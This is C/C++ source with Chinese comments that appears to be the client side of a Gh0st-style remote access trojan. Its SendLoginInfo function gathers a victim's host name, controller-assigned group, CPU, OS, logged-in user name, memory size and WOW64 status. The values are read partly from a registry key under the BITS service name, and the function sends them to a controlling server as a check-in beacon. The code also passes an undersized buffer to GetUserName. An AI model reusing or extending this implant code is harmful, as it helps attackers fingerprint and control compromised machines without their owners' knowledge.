
// 获取主机名
void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,_T("Remark"), REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
}

// 获取分组名
void GetGroupRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,_T("Group"), REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("默认分组"));
}

// 获取CPU信息
void GetCPU(LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",  "ProcessorNameString", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("获取CPU信息失败"));

}

// 获取系统信息
void GetOS(LPTSTR lpBuffer, UINT uSize)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",  "ProductName", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		lstrcat(lpBuffer,_T("获取系统信息失败"));

}

BOOL IsWow64() 
{ 
	HINSTANCE kernel32 = LoadLibrary("kernel32.dll"); 

	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); 
	LPFN_ISWOW64PROCESS fnIsWow64Process; 
	BOOL bIsWow64 = FALSE; 
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process"); 

	typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID); 
	TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess"); 

	if (NULL != fnIsWow64Process) 
	{ 
		fnIsWow64Process(myGetCurrentProcess(),&bIsWow64);
	}

	if(kernel32)
		FreeLibrary(kernel32);
	return bIsWow64; 
}



//发送上线信息
int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;

	// 登录信息
	LOGININFO*	LoginInfo = new LOGININFO;
	ZeroMemory(LoginInfo,sizeof(LOGININFO));
	// 开始构造数据
	LoginInfo->bToken = TOKEN_LOGIN; // 令牌为登录

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	memcpy(&LoginInfo->IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

	// 注册表键值
	TCHAR strSubKey[MAX_PATH];
	wsprintf(strSubKey, _T("SYSTEM\\CurrentControlSet\\Services\\%s"), _T("BITS"));

	// 主机名
	GetHostRemark( LoginInfo->HostName, sizeof(LoginInfo->HostName),strSubKey);

	// 分组名
	GetGroupRemark( LoginInfo->UpGroup, sizeof(LoginInfo->UpGroup),strSubKey);

	// CPU信息
	GetCPU( LoginInfo->CPUClockMhz, sizeof(LoginInfo->CPUClockMhz));

	// 系统信息
	GetOS( LoginInfo->szOS, sizeof(LoginInfo->szOS));

	//当前登录用户名
	TCHAR Name[100]={0};
	DWORD dwSize1=300;
	GetUserName(Name,&dwSize1);
	strcpy(LoginInfo->szUser,Name);

	// 内存
	MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
	MemInfo.dwLength=sizeof(MemInfo); 
	GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo->dwMemSize = (unsigned long)strMem;

	// 是否为64位系统
	LoginInfo->bIsWow64  = IsWow64();

	// Speed
	LoginInfo->dwSpeed = dwSpeed;

	nRet = pClient->Send((LPBYTE)LoginInfo, sizeof(LOGININFO));
	delete LoginInfo;

	return nRet;
}

